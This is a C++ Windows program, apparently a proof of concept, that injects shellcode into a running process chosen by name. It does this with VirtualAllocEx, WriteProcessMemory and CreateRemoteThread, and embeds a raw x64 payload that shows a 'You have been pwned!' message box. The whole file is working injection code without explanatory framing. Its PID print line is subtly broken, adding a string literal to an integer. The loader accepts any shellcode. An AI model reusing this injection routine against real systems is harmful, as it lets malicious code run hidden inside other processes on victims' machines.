#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <comdef.h>

DWORD FindProcessId(const char *procName) {
	HANDLE hSnapshot;
	PROCESSENTRY32 entry;	// Struct representing a process
	entry.dwSize = sizeof(PROCESSENTRY32);
	DWORD id = 0;
	bool hResult;
	_bstr_t wcName(procName);
	const WCHAR* pName = wcName;

	// Take snapshot of specified processes - (TH32CS_SNAPPROCESS) being all processes
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
	// Retrieve info about first process from hSnapshot
	hResult = Process32First(hSnapshot, &entry);
	// TRUE if entry is copied to `entry` buffer
	while (hResult == TRUE) {
		// String comparison in lower case
		if (_wcsicmp(entry.szExeFile, pName) == 0) {
			id = entry.th32ProcessID;
			break;
		}
		hResult = Process32Next(hSnapshot, &entry);
	}
	CloseHandle(hSnapshot);
	return id;
}
// This payload is just a messsage box
unsigned char payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
"\x8d\x8d\x29\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
"\x00\x3e\x4c\x8d\x85\x23\x01\x00\x00\x48\x31\xc9\x41\xba"
"\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
"\x56\xff\xd5\x59\x6f\x75\x20\x68\x61\x76\x65\x20\x62\x65"
"\x65\x6e\x20\x70\x77\x6e\x65\x64\x21\x00\x50\x77\x6e\x65"
"\x64\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00";

SIZE_T payloadSize = sizeof(payload);

int main(int argc, char *argv[]) {
	if (argc <= 1) return EXIT_FAILURE;

	//char fileName[] = "calculatorApp.exe";
	//char *pName = fileName;

	DWORD processId = FindProcessId(argv[1]);
	//DWORD processId = FindProcessId(pName);

	if (processId == 0) return EXIT_FAILURE;
	std::cout << "PID: " + processId << std::endl;
	// Open existing process object
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

	// Allocate memory buffer for remote process
	LPVOID memBlock = VirtualAllocEx(hProcess, NULL, sizeof(payload), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

	// "copy" data between processes
	WriteProcessMemory(hProcess, memBlock, (LPVOID)payload, payloadSize, NULL);

	// Creates a thread that runs in virtual memory of another process (hProcess)
	HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)memBlock, NULL, 0, NULL);
	CloseHandle(hProcess);
	return EXIT_SUCCESS;
}
